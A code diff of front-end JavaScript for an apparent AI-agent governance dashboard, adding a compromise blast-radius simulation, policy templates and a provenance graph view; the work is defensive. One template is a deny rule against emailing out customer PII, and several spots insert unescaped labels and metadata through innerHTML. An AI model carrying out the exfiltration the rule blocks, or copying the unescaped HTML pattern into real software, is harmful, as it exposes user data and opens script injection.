+  const verdict = document.getElementById('compromiseVerdict');
+  const verdictBody = document.getElementById('compromiseVerdictBody');
+  theater.style.display = 'block';
+  verdict.style.display = 'none';
+  theater.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+  compromiseRevealStage = 0;
+  drawBlast(agt, br, [], { stage: 0 });
+  pulseAgentNode(agt, br);
+
+  const lines = [
+    { text: `<span style="color:#f87171;font-weight:700">&#9888; ASSUMING AGENT '${agt}' IS COMPROMISED...</span>`, stage: 0 },
+    { text: `Enumerating direct tool capabilities&hellip; <b>${br.tools.length} tool(s)</b> reachable: ${br.tools.map(t => t.tool).join(', ') || 'none'}`, stage: 1 },
+    { text: `Walking delegation resource patterns&hellip; <b>${br.resources.length} resource class(es)</b> exposed: ${br.resources.map(r => r.resourceType).join(', ') || 'none'}`, stage: 2 },
+    { text: `Computing lateral movement via sponsor/delegation chain&hellip; <b>${br.reachableAgents.length} adjacent agent(s)</b> reachable${br.reachableAgents.length ? ': ' + br.reachableAgents.join(', ') : ''}`, stage: 3 },
+    { text: `Cross-referencing ${paths.length} known privilege-escalation path(s)&hellip; ${paths.length ? paths.length + ' potential route(s) found' : 'none found — delegation is well-isolated'}`, stage: 3 },
+    { text: `<span style="color:${br.maxExposure > 5000 ? '#f87171' : '#34d399'}">Maximum single-session financial exposure: <b>$${br.maxExposure.toLocaleString()}</b></span>`, stage: 3 }
+  ];
+
+  narrateLines(narrEl, lines, () => {
+    stopPulse();
+    drawBlast(agt, br, paths, { stage: 3 });
+    const sev = br.riskClass === 'CRITICAL' || br.maxExposure > 5000 ? 'SEVERE' : br.riskClass === 'HIGH' ? 'SIGNIFICANT' : 'CONTAINED';
+    const sevColor = sev === 'SEVERE' ? '#f87171' : sev === 'SIGNIFICANT' ? '#fbbf24' : '#34d399';
+    verdictBody.innerHTML = `Overall exposure: <b style="color:${sevColor}">${sev}</b>. A compromise of <b>${agt}</b> could directly invoke <b>${br.tools.length}</b> tool(s), touch <b>${br.resources.length}</b> resource class(es), reach <b>${br.reachableAgents.length}</b> other agent(s), and expose up to <b>$${br.maxExposure.toLocaleString()}</b> in a single session before Chronicle's per-delegation cumulative limits and monotonic narrowing invariants halt further spread.<br><br><span style="color:var(--tm);font-size:11.5px">This is a live reachability analysis over the real delegation graph, not a canned demo — recompute after editing delegations to see it change.</span>`;
+    verdict.style.display = 'block';
+    btn.disabled = false;
+    btn.innerHTML = '&#9762; Simulate Compromise';
   });
 }
 
@@ -3734,7 +3975,7 @@ function renderIncidents(inc) {
 }
 
 const PTMPL = {
-  refund: `POLICY refund_approval_safety\nALLOW stripe_refund\nWHEN NOT resource.sensitivity == "RESTRICTED"\n  AND amount <= 5000\n  OR workflow.state == "APPROVED"\nREQUIRE_APPROVAL_ABOVE 2500`,
+  refund: `POLICY refund_approval_safety\nALLOW stripe_refund\nWHEN NOT resource.sensitivity == "CRITICAL"\n  AND amount <= 5000\n  OR workflow.state == "APPROVED"\nREQUIRE_APPROVAL_ABOVE 2500`,
   dlp: `POLICY data_loss_prevention\nDENY send_external_email\nWHEN sequence.has_occurred("read_customer_pii")\n  OR resource.sensitivity == "CONFIDENTIAL"`,
   k8s: `POLICY kubernetes_deploy_gate\nALLOW deploy_container\nWHEN environment == "staging"\n  AND NOT resource.sensitivity == "CRITICAL"\nREQUIRE_APPROVAL_ABOVE 0`,
   wire: `POLICY wire_transfer_protection\nDENY send_wire_transfer\nWHEN NOT agent.type == "TREASURY_OPS"\n  OR amount > 50000`,
@@ -4063,29 +4304,79 @@ async function loadDAG() {
   const out = document.getElementById('dagout');
   out.innerHTML = '<div class="spinner"></div>';
   try {
-    let g;
-    try { g = await GET('/api/v1/analytics/provenance/' + aid); } catch (e) { g = await GET('/api/v1/actions/' + aid + '/provenance'); }
+    const g = await GET('/api/v1/analytics/provenance/' + aid);
+    if (!g) throw new Error('not found');
     renderDAG(g, out);
   } catch (e) {
-    out.innerHTML = '<div style="color:var(--tm)">No provenance data found for action: ' + aid + '. Make sure the action exists in the ledger.</div>';
+    out.innerHTML = '<div style="color:var(--tm)">No provenance graph available for action: ' + aid + '. Make sure the action exists in the ledger.</div>';
   }
 }
 
+/** Orders ProvenanceGraph nodes into a display sequence by walking edges breadth-first from the root (first node with no incoming edge). */
+function topoOrderProvenance(nodes, edges) {
+  const incoming = new Set(edges.map(e => e.to));
+  const root = nodes.find(n => !incoming.has(n.id)) || nodes[0];
+  const byId = Object.fromEntries(nodes.map(n => [n.id, n]));
+  const adjacency = {};
+  edges.forEach(e => { (adjacency[e.from] = adjacency[e.from] || []).push(e); });
+
+  const ordered = [];
+  const relationInto = {};
+  const seen = new Set();
+  const queue = [root.id];
+  while (queue.length) {
+    const id = queue.shift();
+    if (seen.has(id) || !byId[id]) continue;
+    seen.add(id);
+    ordered.push(byId[id]);
+    (adjacency[id] || []).forEach(e => {
+      if (!seen.has(e.to)) { relationInto[e.to] = e.relation; queue.push(e.to); }
+    });
+  }
+  nodes.forEach(n => { if (!seen.has(n.id)) ordered.push(n); });
+  return { ordered, relationInto };
+}
+
 function renderDAG(g, el) {
-  if (!g || Object.keys(g).length === 0) {
+  if (!g || !Array.isArray(g.nodes) || g.nodes.length === 0) {
     el.innerHTML = '<div style="color:var(--tm)">No provenance graph available.</div>';
     return;
   }
-  const tc = { SPONSOR: '#f9572a', AGENT: '#ff8a65', DELEGATION: '#e59324', TASK: '#10b981', POLICY: '#f59e0b', ACTION: '#fb923c', RESOURCE: '#ef4444', GRANT: '#34d399', RECEIPT: '#f472b6' };
-  const entries = Object.entries(g);
-  el.innerHTML = entries.map(([nt, nd], i) => {
-    const c = tc[nt.toUpperCase()] || '#f9572a';
-    return `${i > 0 ? '<div class="dagcon"></div>' : ''}<div class="dagn">
+  const tc = { HUMAN: '#f9572a', AGENT: '#ff8a65', DELEGATION: '#e59324', TASK: '#10b981', POLICY: '#f59e0b', ACTION: '#fb923c', RESOURCE: '#ef4444', GRANT: '#34d399', RECEIPT: '#f472b6' };
+  const { ordered, relationInto } = topoOrderProvenance(g.nodes, g.edges || []);
+
+  el.innerHTML = '';
+  const decisionBadge = g.decision ? `<div style="margin-bottom:11px;display:flex;align-items:center;gap:8px"><span class="badge b${dKey(g.decision)}">${g.decision}</span><span style="font-size:11.5px;color:var(--ts)">${g.explanation || ''}</span></div>` : '';
+  el.insertAdjacentHTML('beforeend', decisionBadge);
+
+  ordered.forEach((n, i) => {
+    const c = tc[n.type] || '#f9572a';
+    const rel = relationInto[n.id];
+    const wrap = document.createElement('div');
+    wrap.style.opacity = '0';
+    wrap.innerHTML = `${i > 0 ? `<div class="dagcon" style="position:relative">${rel ? `<span style="position:absolute;left:9px;top:-2px;font-size:8.5px;color:var(--tm);font-family:var(--m);white-space:nowrap">${rel}</span>` : ''}</div>` : ''}<div class="dagn" style="flex-wrap:wrap;cursor:pointer">
       <div style="width:7px;height:7px;border-radius:50%;background:${c};box-shadow:0 0 7px ${c};flex-shrink:0"></div>
-      <span class="dagt" style="background:${c}20;color:${c}">${nt}</span>
-      <span style="color:var(--ts);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${typeof nd === 'string' ? nd : (nd.id || nd.agentId || nd.grantId || nd.receiptId || JSON.stringify(nd).slice(0, 80))}</span>
+      <span class="dagt" style="background:${c}20;color:${c}">${n.type}</span>
+      <span style="color:var(--ts);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${n.label}</span>
+      <span style="color:var(--tm);font-size:9px">&#9662;</span>
+      <div class="dagmeta" style="display:none;width:100%;margin-top:7px;padding-top:7px;border-top:1px dashed var(--b);font-size:10.5px;color:var(--tm)">${Object.entries(n.metadata || {}).map(([k, v]) => `<div><span style="color:var(--ts)">${k}:</span> ${v}</div>`).join('') || 'No metadata'}</div>
     </div>`;
-  }).join('');
+    const dagn = wrap.querySelector('.dagn');
+    dagn.onclick = () => {
+      const meta = dagn.querySelector('.dagmeta');
+      meta.style.display = meta.style.display === 'none' ? 'block' : 'none';
+    };
+    el.appendChild(wrap);
+    setTimeout(() => { wrap.style.transition = 'opacity .35s ease'; wrap.style.opacity = '1'; }, i * 140);
+  });
+
+  if (g.receiptVerified) {
+    const verified = document.createElement('div');
+    verified.style.cssText = 'margin-top:12px;padding:9px 12px;border-radius:7px;background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.3);color:#34d399;font-size:11.5px;font-weight:600;opacity:0;transition:opacity .4s ease';
+    verified.innerHTML = '&#10003; Chain cryptographically verified — every hop is Merkle-linked and Ed25519-signed';
+    el.appendChild(verified);
+    setTimeout(() => { verified.style.opacity = '1'; }, ordered.length * 140 + 150);
+  }
 }
 
 /* INTERACTIVE DEMO STEP SWITCHER & ZERO-TRUST RUNTIME SIMULATOR (SILKY SMOOTH) */
